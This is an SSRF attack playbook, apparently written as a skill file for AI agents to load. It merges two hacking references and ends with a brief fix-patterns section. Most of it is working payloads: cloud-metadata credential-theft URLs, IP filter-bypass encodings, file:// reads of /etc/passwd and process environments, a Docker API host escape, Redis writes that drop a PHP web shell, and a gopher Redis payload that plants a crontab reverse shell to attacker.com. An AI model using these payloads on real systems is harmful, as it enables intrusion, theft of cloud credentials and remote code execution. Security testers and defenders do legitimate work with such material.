---
name: ssrf
description: "SSRF playbook. Use when the server fetches URLs, resolves hostnames, imports remote content, or can be driven toward internal networks, cloud metadata, or secondary protocols."
domain: web-injection
merged: true
merged_from: [hack-skills:ssrf-server-side-request-forgery, hacking-skills:ssrf]
---

# ssrf

> **Fusionierter Skill** — vereint 2 Quell-Skills zu einem: `hack-skills:ssrf-server-side-request-forgery`, `hacking-skills:ssrf`. Alle Techniken aller Quellen sind unten zusammengeführt, nichts ausgelassen.

## Quelle: hack-skills — ssrf-server-side-request-forgery (324 Zeilen)

# SKILL: Server-Side Request Forgery (SSRF) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert SSRF techniques. Covers URL filter bypass, cloud metadata endpoints, protocol exploitation, blind SSRF detection, and chaining to RCE. Base models know basic 169.254.169.254 — this file covers what they miss. For real-world CVE chains, DNS Rebinding deep dives, K8s SSRF, and SSRF → Redis → RCE full exploitation, load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. QUICK START

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- WebLogic SSRF (CVE-2014-4210) — `uddiexplorer/SearchPublicRegistries.jsp` + `operator` parameter + `%0D%0A` CRLF to inject Redis commands
- SSRF → internal Redis → write crontab reverse shell complete payload chain
- DNS Rebinding deep dive — TTL=0 trick, initial-legit→second-internal resolution, `rbndr.us` service
- Kubernetes SSRF (CVE-2020-8555) and bypass (CVE-2020-8562) via DNS rebinding
- SSRF through PDF/screenshot generators — `<iframe>` and `<img>` in HTML-to-PDF
- Gopher protocol full TCP injection — Redis, MySQL, FastCGI payloads via Gopherus
- URL parser confusion for filter bypass — `#@`, `\@`, `%00@`, IPv6-mapped IPv4

### Advanced Reference

Also load [URL_PARSER_TRICKS.md](./URL_PARSER_TRICKS.md) when you need:
- URL parser differential table: Python urllib vs requests vs Java URL vs PHP parse_url vs Node url.parse vs Go net/url
- Full cloud metadata endpoint catalog (AWS IMDSv1/v2, GCP, Azure, DigitalOcean, Alibaba Cloud, Oracle Cloud, Kubernetes, Hetzner, OpenStack)
- gopher:// payload recipes for Redis, MySQL, SMTP, FastCGI, Memcached (with encoding rules)
- DNS Rebinding detailed attack flow with TTL manipulation and TOCTOU analysis
- PDF/wkhtmltopdf/WeasyPrint/Chrome headless/PhantomJS SSRF patterns and exfiltration techniques

If you just found a parameter that fetches a URL, perform first-pass confirmation here directly.

### First-pass payloads

```text
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://127.1/
```

### Host validation bypass families

| Validation Type | Try |
|---|---|
| blocks `localhost` string | `127.0.0.1`, `127.1`, `[::1]` |
| blocks direct IP only | internal DNS name, decimal/octal/hex IP forms |
| allowlist by prefix | username part, subdomain confusion, redirect chain |
| follows redirects | benign external URL redirecting to internal target |
| parses once, fetches twice | mixed encoding or DNS rebinding style targets |

### Protocol routing

| Goal | Protocol / Target |
|---|---|
| cloud credentials | metadata HTTP endpoints |
| internal HTTP admin | `http://127.0.0.1:port/` |
| Redis / raw TCP style abuse | `gopher://` |
| local file read candidate | `file://` |
| dictionary / banner tests | `dict://` |

---

## 1. FINDING SSRF SURFACE

Look for **any parameter containing DNS names, IP addresses, or URLs**:

```
loc=           url=        path=         endpoint=
imageUrl=      dest=       redirect=     uri=
callback=      load=       file=         resource=
link=          src=        data=         ref=
```

**Less obvious SSRF vectors**:
- PDF/screenshot generation (URL to capture)
- Webhook configuration fields
- Import/export via URL (CSV import, RSS/Atom feeds)
- OAuth redirect URI (sometimes triggers server-side fetch)
- `X-Forwarded-Host` / `X-Real-IP` headers in proxy chains
- XML `DOCTYPE` with external entity (`file://`, `http://`)
- GraphQL `@link` directive (federation)
- Content-Type: `text/html` pages parsed for `<link>` preload headers

---

## 2. BASIC CONFIRMATION METHODOLOGY

```
Step 1: Supply your Burp Collaborator / interact.sh URL
        → Check server initiates outbound connection (full SSRF confirmed)

Step 2: If no callback → test time-based (open port = fast, closed = slow/reset):
        Compare response time for:
        http://192.168.1.1:22   (likely open → fast)
        http://192.168.1.1:9999 (likely closed → slow/timeout)

Step 3: Try accessing localhost services:
        http://127.0.0.1:8080
        http://127.0.0.1:22
        http://127.0.0.1:6379  (Redis)
        http://127.0.0.1:9200  (Elasticsearch)
        http://127.0.0.1:5984  (CouchDB)
        http://127.0.0.1:2375  (Docker daemon — critical!)
        http://127.0.0.1:4840  (internal admin)
```

---

## 3. CLOUD METADATA ENDPOINTS — MUST-TRY

### AWS EC2 IMDSv1 (no auth required — critical)
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
```

### AWS IMDSv2 (token required — but check if SSRF can GET the token)
```
Step 1: PUT http://169.254.169.254/latest/api/token
        Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
Step 2: GET http://169.254.169.254/latest/meta-data/
        Header: X-aws-ec2-metadata-token: TOKEN
```
**If SSRF supports custom headers → full IMDSv2 bypass**.

### Google Cloud
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Headers: Metadata-Flavor: Google
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Headers: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/
```

### Alibaba Cloud
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Kubernetes Service Account
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
http://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

---

## 4. IP ADDRESS FILTER BYPASS TECHNIQUES

When `169.254.169.254`, `127.0.0.1`, `localhost` are blocked:

### Localhost Variants
```
127.0.0.1
127.1
127.0.1
127.000.000.001    ← octal padding
0x7f000001         ← hex
2130706433         ← decimal (0x7f000001)
0177.0000.0000.0001  ← octal
[::]               ← IPv6 loopback
[::1]              ← IPv6 loopback
[::ffff:127.0.0.1] ← IPv4-mapped IPv6
```

### 169.254.169.254 Variants
```
169.254.169.254
2852039166               ← decimal
0xa9fea9fe               ← hex
0251.0376.0251.0376      ← octal
[::ffff:169.254.169.254] ← IPv6
169.254.169.254.nip.io   ← DNS rebinding service
```

### Private Network Ranges
```
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
fc00::/7  ← IPv6 private
```

### Bypass Filter via DNS Input
If filter checks DNS-resolved IP (not hostname):
```
http://attacker.com/  ← DNS A record points to 169.254.169.254
```
Use DNS rebinding: initial lookup returns valid IP → passes filter → second request returns internal IP.

---

## 5. URL SCHEME ATTACKS

When `http://` is allowed or weakly filtered:

```
file:///etc/passwd
file:///proc/self/environ
file:///proc/net/arp   ← reveals internal network ARP table
file:///proc/net/tcp   ← open network connections

dict://127.0.0.1:6379/INFO   ← Redis INFO command via dict://

gopher://127.0.0.1:6379/_INFO%0d%0a   ← Redis via gopher
gopher://127.0.0.1:9200/   ← Elasticsearch

sftp://attacker.com:11111/   ← triggers SFTP connection (credential hash)
ldap://attacker.com:389/     ← triggers LDAP bind
ftp://attacker.com/          ← triggers FTP connection
```

### Redis Gopher SSRF (full RCE potential)
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0Aping%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2456%0D%0A%0D%0A%0A%0A*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0A%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```

---

## 6. BLIND SSRF DETECTION

When response doesn't reflect fetched content:

1. **Burp Collaborator / interact.sh**: check for DNS + HTTP request from server
2. **Pingback/webhook abuse**: configure application's own webhook to your URL
3. **Timing analysis**: Internal open port vs closed port response time difference
4. **Error analysis**: Different error messages for "host not found" vs "connection refused" vs "timeout" reveal internal network topology

---

## 7. INTERNAL SERVICE EXPLOITATION

### Docker API (2375 unauthenticated)
```
http://127.0.0.1:2375/v1.24/containers/json      ← list containers
http://127.0.0.1:2375/v1.24/images/json          ← list images
# Create privileged container → escape to host:
POST http://127.0.0.1:2375/v1.24/containers/create
{"Image":"alpine","Cmd":["cat","/etc/shadow"],"HostConfig":{"Binds":["/:/host"]}}
```

### Elasticsearch (9200 no-auth default)
```
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/.kibana/_search
http://127.0.0.1:9200/INDEX_NAME/_search?q=*
```

### Redis (6379 — no-auth common)
```
dict://127.0.0.1:6379/CONFIG:SET:dir:/var/www/html
dict://127.0.0.1:6379/CONFIG:SET:dbfilename:shell.php
dict://127.0.0.1:6379/SET:key:<?php system($_GET[c]);?>
dict://127.0.0.1:6379/BGSAVE
```

### Internal Admin Panels
```
http://127.0.0.1:8080/admin
http://127.0.0.1:8443/admin
http://127.0.0.1:9000/actuator   ← Spring Boot actuator (exposed endpoints)
http://127.0.0.1:9000/actuator/env
http://127.0.0.1:9000/actuator/heapdump
```

---

## 8. SSRF + FILTER BYPASS DECISION TREE

```
SSRF parameter found?
├── Try http://169.254.169.254/ directly → blocked?
│   ├── Try decimal/hex/octal variants
│   ├── Try IPv6 variants [::ffff:169.254.169.254]
│   ├── Try DNS rebinding (nip.io, custom NS)
│   └── Try redirect: attacker.com → 169.254.169.254 (302)
│
├── Try http://127.0.0.1/ → blocked?
│   ├── Try 127.1 / 127.0.1 / 0x7f000001 / 2130706433
│   ├── Try localhost → might not be blocked
│   └── Try IPv6 [::1]
│
├── What protocols are allowed?
│   ├── dict:// → test Redis, Memcached
│   ├── gopher:// → full TCP data injection (target Redis/SMTP)
│   ├── file:// → local file read
│   └── sftp:// ldap:// ftp:// → network interactions
│
└── Blind SSRF → use Burp Collaborator
    └── DNS-only → use DNS rebinding or SSRF with OOB DNS
```

---

## 9. THE SSRF-FILTER MINDSET

From zseano's methodology: **if developers filter only `169.254.169.254` directly but not `http://169.254.169.254/latest/meta-data`** (full path), or forget about:
- IPv6 equivalents  
- DNS names that resolve to internal IPs
- Redirect chains (server follows 302 to internal IP)

**Classic gap**: App filters `127.0.0.1` but not `127.1` or `[::1]` or `localhost`.

**Application-layer SSRF via XML** (when app parses XML):
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<request>&xxe;</request>
```

## Quelle: hacking-skills — ssrf (132 Zeilen)

# Server-Side Request Forgery (SSRF)

## What Is Broken and Why
SSRF occurs when an application fetches a remote resource based on user-supplied input without adequate validation. The server makes the request on behalf of the attacker, bypassing network perimeter controls that would block the attacker's direct access. Common targets include internal admin panels (accessible only from localhost), cloud metadata services (AWS/GCP/Azure instance metadata), internal databases and APIs, and arbitrary files on the server filesystem via the `file://` scheme.

## Key Signals
- Parameters named `url`, `uri`, `path`, `redirect`, `link`, `src`, `href`, `fetch`, `load`, `resource`, `page`, `feed`, `callback`, `proxy`
- Application fetches external content on behalf of the user (URL previews, webhooks, file imports, image fetching)
- PDF/report generators that render HTML (often process `<img>`, `<iframe>`, `<link>` tags server-side)
- Webhook configurations accepting attacker-controlled URLs
- Import features (RSS feeds, remote files, API integrations)
- Blind SSRF: no visible response but out-of-band DNS/HTTP callbacks observed

## Methodology
1. Identify all parameters that accept URLs, hostnames, or IP addresses.
2. Submit your OOB callback URL (Burp Collaborator, interactsh) to detect blind SSRF.
3. Test for internal service access: `http://127.0.0.1/`, `http://localhost/admin`, `http://192.168.0.1/`
4. Test cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/`
5. Test file scheme: `file:///etc/passwd`, `file:///etc/hosts`, `file:///proc/self/environ`
6. For PDF generators: inject `<iframe src="http://169.254.169.254/">`, `<img src="file:///etc/passwd">`
7. Test bypass techniques if initial attempts are filtered.
8. Enumerate internal network: try common internal ranges and port ranges.
9. Chain with other vulnerabilities (e.g., SSRF → internal Redis → RCE).

## Payloads & Tools
```
# Direct internal access
TARGET/page?url=http://127.0.0.1/admin
TARGET/page?url=http://localhost:8080/internal
TARGET/page?url=http://192.168.1.1/

# Cloud metadata (AWS)
TARGET/page?url=http://169.254.169.254/latest/meta-data/
TARGET/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Cloud metadata (GCP)
TARGET/page?url=http://metadata.google.internal/computeMetadata/v1/
TARGET/page?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# File scheme
TARGET/page?url=file:///etc/passwd
TARGET/page?url=file:///etc/hosts
TARGET/page?url=file:///proc/self/environ
TARGET/page?url=file:///c:/windows/win.ini

# OOB blind SSRF detection
TARGET/page?url=http://VICTIM.burpcollaborator.net/ssrf-test
TARGET/page?url=http://VICTIM.interactsh.com/

# PDF generator injection (HTML payload in content field)
<iframe src="http://169.254.169.254/latest/meta-data/" width="500" height="500">
<img src="file:///etc/passwd">
<script src="http://169.254.169.254/"></script>

# IP filter bypass — alternate representations of 127.0.0.1
TARGET/page?url=http://2130706433/          # decimal
TARGET/page?url=http://017700000001/        # octal
TARGET/page?url=http://127.1/              # shorthand
TARGET/page?url=http://0x7f000001/         # hex

# URL parser confusion
TARGET/page?url=http://TARGET-DOMAIN@VICTIM-INTERNAL/path
TARGET/page?url=http://VICTIM-INTERNAL#TARGET-DOMAIN

# curl-based manual testing
curl -s "TARGET/fetch?url=http://127.0.0.1:6379/" -v   # Redis
curl -s "TARGET/fetch?url=http://127.0.0.1:27017/"      # MongoDB
curl -s "TARGET/fetch?url=http://127.0.0.1:2375/info"   # Docker daemon
```

## Bypass Techniques
- Decimal IP: `2130706433` = `127.0.0.1`
- Octal IP: `017700000001` = `127.0.0.1`
- Hex IP: `0x7f000001` = `127.0.0.1`
- IPv6 loopback: `http://[::1]/`
- Short IP: `127.1`, `127.0.1`
- URL userinfo abuse: `http://expected-domain@internal-host/` — parser uses `internal-host` as host
- Fragment abuse: `http://internal-host#expected-domain` — some validators check fragment
- URL-encode entire host portion
- Case variation: `HTTP://127.0.0.1`, `Http://localhost`
- DNS rebinding: domain initially resolves to allowed IP, then switches to internal IP after validation
- Redirect chain: supply allowed URL that 301-redirects to internal target
- Protocol confusion: `dict://`, `gopher://`, `ftp://`, `ldap://` if application uses generic URL fetcher

## Exploitation Scenarios
**Scenario 1 — AWS Metadata Credential Theft**
Setup: Image import feature fetches URL and stores image; no URL validation beyond HTTP/HTTPS scheme check.
Trigger: `TARGET/import?imageUrl=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME`
Impact: AWS IAM temporary credentials returned in response; attacker accesses S3 buckets, EC2 APIs.

**Scenario 2 — Internal Admin Panel Access**
Setup: Webhook test feature sends HTTP request to user-supplied URL.
Trigger: `TARGET/webhook/test?url=http://127.0.0.1:8080/admin/users` — internal admin API returns user list.
Impact: Unauthenticated access to internal administrative functionality, user enumeration, potential account takeover.

**Scenario 3 — Blind SSRF via PDF Generator**
Setup: Invoice PDF generation renders HTML; no URL parameters visible but HTML content is user-supplied.
Trigger: Inject `<img src="http://VICTIM.interactsh.com/blind-ssrf">` into invoice address field.
Impact: OOB HTTP callback confirms SSRF; escalate to `file:///etc/passwd` in img src to read server files via PDF output.

## False Positives
- Application fetching URLs from a strictly maintained allowlist (verify allowlist can't be bypassed)
- SSRF to external URLs only where internal network is not reachable from server
- OOB callbacks from security scanners or crawlers already probing the application
- Redirect to internal host that returns only a generic error (not necessarily exploitable)

## Fix Patterns
- Allowlist permitted URL schemes (https only), hosts, and ports rather than blocklisting
- Resolve DNS and verify the resolved IP is not in RFC 1918 / loopback / link-local ranges before fetching
- Use a dedicated egress proxy or network segment that cannot reach internal services
- Disable unused URL schemes in HTTP client libraries
- Return opaque responses (don't reflect fetched content body to user) for non-critical fetch features
- Apply network-level controls: prevent web server from initiating connections to internal networks

## Related Skills

[[xxe]] and SSRF are deeply related: an XXE payload using an `http://` entity is a form of SSRF, and XXE can trigger SSRF to reach internal services or cloud metadata endpoints. [[http-request-smuggling]] can pivot into SSRF by using the smuggled prefix to reach internal back-end services that the front-end proxy would otherwise block. [[cors-misconfig]] exploits a similar trust boundary as SSRF — both let an attacker leverage the server's trusted network position. In mobile, [[mobile-network-security]] covers SSRF risks through mobile backend API misconfigurations.
